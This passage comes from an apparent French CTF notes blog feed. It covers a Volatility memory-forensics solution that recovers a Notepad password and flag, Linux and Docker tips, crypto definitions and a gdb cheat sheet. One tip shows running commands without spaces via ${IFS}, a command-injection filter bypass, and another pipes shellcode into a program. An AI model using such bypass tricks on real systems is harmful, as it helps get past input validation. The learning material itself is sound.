&lt;p&gt;C’est sûrement le flag trivial de la consigne. Ce dernier ne respecte pas le bon format, nous avons un &lt;code class=&quot;highlighter-rouge&quot;&gt;sigsevg&lt;/code&gt;au lieu d’un &lt;code class=&quot;highlighter-rouge&quot;&gt;sigsegv&lt;/code&gt;.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;notepad&quot;&gt;Notepad&lt;/h2&gt;

&lt;hr /&gt;

&lt;p&gt;On se rappelle qu’une instance de Notepad a été lancée, peut-être que le mot de passe à été saisie dans celle-ci. Ce &lt;a href=&quot;https://www.andreafortuna.org/2018/03/02/volatility-tips-extract-text-typed-in-a-notepad-window-from-a-windows-memory-dump/&quot;&gt;post&lt;/a&gt; explique comment bien analyser un dump de Notepad.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;pslist&lt;/code&gt;- Print all running processes by following the EPROCESS lists&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# trouver le PID de notepad&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;vol.py &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; yolo2.raw &lt;span class=&quot;nt&quot;&gt;--profile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Win2008SP2x64 pslist | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'notepad'&lt;/span&gt;
0xfffffa8003f1f760 notepad.exe             156   2748      1       51      1      0 2019-11-14 22:40:37 UTC+0000
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;memdump&lt;/code&gt;- Dump the addressable memory for a process&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# dumper le processus&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;vol.py &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; yolo2.raw &lt;span class=&quot;nt&quot;&gt;--profile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Win2008SP2x64 memdump &lt;span class=&quot;nt&quot;&gt;--dump-dir&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 156
Volatility Foundation Volatility Framework 2.6.1
&lt;span class=&quot;k&quot;&gt;************************************************************************&lt;/span&gt;
Writing notepad.exe &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;   156] to 156.dmp
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# recherche&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;strings &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; l 156.dmp | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'password'&lt;/span&gt;
password : RTFM_YELAA
&lt;span class=&quot;c&quot;&gt;# -e encoding&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# s = single-7-bit-byte characters&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# S = single-8-bit-byte characters&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# b = 16-bit bigendian&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# l = 16-bit littleendian&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# B = 32-bit bigendian&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# L = 32-bit littleendian&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;La petite subtilité de Notepad est que ce dernier stock les fichiers texts en 16 bits en little-endian. C’est pour cela que l’on fourni l’option &lt;code class=&quot;highlighter-rouge&quot;&gt;-e l&lt;/code&gt; à &lt;code class=&quot;highlighter-rouge&quot;&gt;strings&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;On trouve alors le mot de passe &lt;code class=&quot;highlighter-rouge&quot;&gt;RTFM_YELAA&lt;/code&gt;, ce dernier permet de déchiffrer le contenu présent sur &lt;code class=&quot;highlighter-rouge&quot;&gt;https://cryptobin.co/71q7y462&lt;/code&gt;. On trouve alors le flag.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;sigsegv2{Pow3r_oF_Vol}&lt;/code&gt;&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>linux</title>
   <link href="http://localhost:4000/ctf/2019/07/29/linux/"/>
   <updated>2019-07-29T00:00:00+02:00</updated>
   <id>http://localhost:4000/ctf/2019/07/29/linux</id>
   <content type="html">&lt;!--more--&gt;

&lt;h2 id=&quot;rofi-menu&quot;&gt;Rofi menu&lt;/h2&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# select pid
$ ps -ef | rofi -dmenu | awk '{print $2}'
$ alias rkill='kill -9 $(ps a | rofi -dmenu | awk &quot;{ print $1 }&quot;)'
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;execute-bash-commands-without-spaces&quot;&gt;Execute bash commands without spaces&lt;/h2&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ {ping,-c,1,127.0.0.1}
$ ping${IFS}-c${IFS}1${IFS}127.0.0.1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;docker&quot;&gt;Docker&lt;/h2&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# find docker image
$ sudo docker search ubuntu --limit 10

# pull image
$ sudo docker pull ubuntu:18.04 # will be placed in /var/lib/docker/

# get shell in the container
$ sudo docker run -it ubuntu:18.04

# execute command on running container
$ sudo docker exec awesome_hertz &quot;id&quot;

# get stdout
$ sudo docker logs awesome_hertz
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;dockerfile&quot;&gt;Dockerfile&lt;/h4&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;FROM ubuntu:18.04

RUN apt update &amp;amp;&amp;amp; apt install -y socat

COPY ./start.sh /root
COPY ./script.sh /var/www/html

USER analyzer # create user
WORKDIR /home/analyzer # define pwd

CMD [&quot;/bin/sh&quot;]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;FROM ubuntu:18.04
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Specify the base image to use.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;RUN apt update &amp;amp;&amp;amp; apt install socat
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Execute command in the container.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;COPY ./script.sh /var/www/html
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Copy file from outside.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;CMD [&quot;/bin/sh&quot;] # or ENTRYPOINT [&quot;/root/start.sh&quot;]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The first action to do, command or script.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# delete image
$ docker image rm -f 3d58eb2db4a0 # img_id
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
</content>
 </entry>
 
 <entry>
   <title>crypto</title>
   <link href="http://localhost:4000/ctf/2019/07/28/crypto/"/>
   <updated>2019-07-28T00:00:00+02:00</updated>
   <id>http://localhost:4000/ctf/2019/07/28/crypto</id>
   <content type="html">&lt;!--more--&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;hash&quot;&gt;hash&lt;/h2&gt;
&lt;hr /&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# fichier de md5&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;john &lt;span class=&quot;nt&quot;&gt;--format&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;raw-md5 &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; ./a.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;encoding&quot;&gt;encoding&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;Transformer des données d’un format à un autre en utilisant une table de correspondance. Il est facile de retrouver les données en connaissant la table.&lt;br /&gt;
Ex: &lt;code class=&quot;highlighter-rouge&quot;&gt;ASCII, base64,...&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;encryption&quot;&gt;encryption&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;Transformer des données pour les garder secrètes (non compréhensible par un tier). On utilise pour cela un algorithme et un système de clé pour chiffrer et déchiffrer les données.&lt;/p&gt;

&lt;p&gt;Ces algorithmes sont classés de deux maniéres:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;utilisation de couple clé secrète/publique ou d’une clé partagée, on parle de chiffrement asymétrique ou symétrique.&lt;/li&gt;
  &lt;li&gt;utilisant des blocs ou des flux de données à l’entrée du chiffrement, on parle de chiffrement par flux ou par blocs.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Algorithme asymétriques:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Échange de clé de Diffie-Hellman&lt;/li&gt;
  &lt;li&gt;Rivest Shamir Adleman (RSA) &amp;lt;- used&lt;/li&gt;
  &lt;li&gt;Elliptic Curve Cryptography (ECC)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Algorithme symétriques:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Data Encryption Standard (DES)&lt;/li&gt;
  &lt;li&gt;Triple DES (3DES)&lt;/li&gt;
  &lt;li&gt;Advanced Encryption Standard (AES) &amp;lt;- used&lt;/li&gt;
  &lt;li&gt;Rivest Cipher 4 (RC4)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Modes de chiffrement par blocs:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Electronic Code Book (ECB)&lt;/li&gt;
  &lt;li&gt;Cipher Block Chaining (CBC)&lt;/li&gt;
  &lt;li&gt;Counter (CTR)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Ex: &lt;code class=&quot;highlighter-rouge&quot;&gt;AES, RSA, Blowfish,...&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;hashing&quot;&gt;hashing&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;Permet de garantir l’intégrité (ce que l’on envoi == ce que l’on reçoit) des données lors d’un échange. Si les données ont changé, on peut facilement le remarquer.
L’ajout d’un sel (salt) concaténé à ce que l’on veut hacher va permettre par exemple pour un même mot de passe, d’avoir des hachés différents (car les salts sont différents.)&lt;/p&gt;

&lt;p&gt;Caractèristiques importantes:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;la même entrée donne la même sortie.&lt;/li&gt;
  &lt;li&gt;différentes entrées ne doivent pas donner la même sortie.&lt;/li&gt;
  &lt;li&gt;il n’est pas possible de retrouver l’entrée à partir de la sortie de l’algorithme.&lt;/li&gt;
  &lt;li&gt;un changement de l’entrée doit donner une sortie drastiquement différentes.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Fonctions de hachages:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;MD5 (Message Digest 5)&lt;/li&gt;
  &lt;li&gt;SHA (Secure Hashing Algorithm) v1 and v2&lt;/li&gt;
  &lt;li&gt;NT et NTLM, utilisé par Windows pour stocker les mdp, basé sur MD4&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Ex: &lt;code class=&quot;highlighter-rouge&quot;&gt;SHA-256, SHA-512, MD5,...&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;obfuscation&quot;&gt;obfuscation&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;Rendre un message difficile à lire en réalisant des transformations sur ce dernier. Il est souvent utilisé pour protéger une propriété intelectuelle. L’obfurcation n’est pas considéré comme un moyen sûr de protéger de l’information.&lt;/p&gt;

&lt;p&gt;Ex: l’obfurcation de code JavaScript est utilsé pour empécher le debuggage ou protéger intellectuellemnt un code propriétéaire.&lt;/p&gt;

&lt;h4 id=&quot;sources&quot;&gt;sources&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://danielmiessler.com/study/encoding-encryption-hashing-obfuscation/&quot;&gt;Daniel Miessler&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
 </entry>
 
 <entry>
   <title>reverse</title>
   <link href="http://localhost:4000/ctf/2019/07/27/reverse/"/>
   <updated>2019-07-27T00:00:00+02:00</updated>
   <id>http://localhost:4000/ctf/2019/07/27/reverse</id>
   <content type="html">&lt;!--more--&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;tools&quot;&gt;tools&lt;/h2&gt;
&lt;hr /&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# informations sur le fichier&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file &amp;lt;binary&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# chaînes de caractères&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;strings &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 7 &amp;lt;binary&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# @ zones mémoires, @ fonctions, ...&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nm &amp;lt;binary&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# appels de fonctions&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ltrace &amp;lt;binary&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# appels système et signaux&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;strace &amp;lt;binary&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# @ fonctions&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;readelf &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &amp;lt;binary&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# messages noyau (ex: crash d'un prog. avec EIP)&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;dmesg
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;gdb&quot;&gt;gdb&lt;/h2&gt;
&lt;hr /&gt;

&lt;h4 id=&quot;basic&quot;&gt;basic&lt;/h4&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gdb &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt; ./a.out

&lt;span class=&quot;c&quot;&gt;# intel syntax&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; gdb &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;disassembly-flavor intel

&lt;span class=&quot;c&quot;&gt;# disas&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; disas main

&lt;span class=&quot;c&quot;&gt;# disas with opcodes&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; disas /r main

&lt;span class=&quot;c&quot;&gt;# help&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;help &lt;/span&gt;run
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;help &lt;/span&gt;all

&lt;span class=&quot;c&quot;&gt;# execution&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; r &lt;span class=&quot;c&quot;&gt;# run&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# functions addresses&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; info &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# sections addresses&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; info files

&lt;span class=&quot;c&quot;&gt;# set breakpoint&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; b main
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; b &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;0x12345678
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; b 5 &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;2 &lt;span class=&quot;c&quot;&gt;# with condition&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# edit breakpoints&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; info &lt;span class=&quot;nb&quot;&gt;break&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; delete
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; delete 1
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; disable 1
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;enable &lt;/span&gt;1

&lt;span class=&quot;c&quot;&gt;# execute line by line (code) (sans profondeur)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; n &lt;span class=&quot;c&quot;&gt;# next&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# execution until next breakpoint&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; c &lt;span class=&quot;c&quot;&gt;# continue&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# execute line by line (asm) (avec profondeur)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; step

&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;pagination off

&lt;span class=&quot;c&quot;&gt;# show variable&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; print i &lt;span class=&quot;c&quot;&gt;# p i&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; p i
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; p &amp;amp;i &lt;span class=&quot;c&quot;&gt;# show addresse&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; whatis i &lt;span class=&quot;c&quot;&gt;# show type&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# function signature&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; whatis main

&lt;span class=&quot;c&quot;&gt;# show i value at each step&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; display i

&lt;span class=&quot;c&quot;&gt;# quit&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; q &lt;span class=&quot;c&quot;&gt;# quit&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# edit varible&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10 
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$eip&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10

&lt;span class=&quot;c&quot;&gt;# show env variables&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; show &lt;span class=&quot;nb&quot;&gt;env&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; show &lt;span class=&quot;nb&quot;&gt;env &lt;/span&gt;PATH

&lt;span class=&quot;c&quot;&gt;# afficher la pile d'éxecution&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; where

&lt;span class=&quot;c&quot;&gt;# afficher program counter&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; print &lt;span class=&quot;nv&quot;&gt;$pc&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# sauter à une adresse&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; x 0x55555555474b

&lt;span class=&quot;c&quot;&gt;# afficher stack pointer&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; print &lt;span class=&quot;nv&quot;&gt;$sp&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# exécuter commande shell&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; shell ps

&lt;span class=&quot;c&quot;&gt;# define function in gdb&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; define xxd
    &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;dump binary memory dump.bin &lt;span class=&quot;nv&quot;&gt;$arg0&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$arg0&lt;/span&gt;+&lt;span class=&quot;nv&quot;&gt;$arg1&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;shell xxd dump.bin
    &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;end
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; xxd &amp;amp;j 10 

&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; i r &lt;span class=&quot;c&quot;&gt;# info registers&lt;/span&gt;

&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; x call_me

&lt;span class=&quot;c&quot;&gt;# ce qu'il y a à partir de l'adresse de esp (rsp)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; x/16x &lt;span class=&quot;nv&quot;&gt;$esp&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# affiche instru&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; x/s 0x......

&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; x/s &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;char &lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;environ&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; run &amp;lt; &amp;lt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;python3 ./shellcode.py&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;graphic&quot;&gt;graphic&lt;/h4&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# fenêtre avec le code&lt;/span&gt;
ctrl + x + a

&lt;span class=&quot;c&quot;&gt;# mode assembleur&lt;/span&gt;
ctrl + x + 2

&lt;span class=&quot;c&quot;&gt;# mode registres&lt;/span&gt;
ctrl + x + 2

&lt;span class=&quot;c&quot;&gt;# afficher registres de float&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; tui reg float

&lt;span class=&quot;c&quot;&gt;# afficher les registres généraux&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; tui reg general

&lt;span class=&quot;c&quot;&gt;# afficher tous les registres&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; tui reg all

&lt;span class=&quot;c&quot;&gt;# commande précédente&lt;/span&gt;
ctrl + p

&lt;span class=&quot;c&quot;&gt;# backtrace&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; bt

&lt;span class=&quot;c&quot;&gt;# reviens juste avant la fin&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; reverse-stepi
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;functions&quot;&gt;functions&lt;/h4&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# executed at each stop (not only breakpoint)&lt;/span&gt;
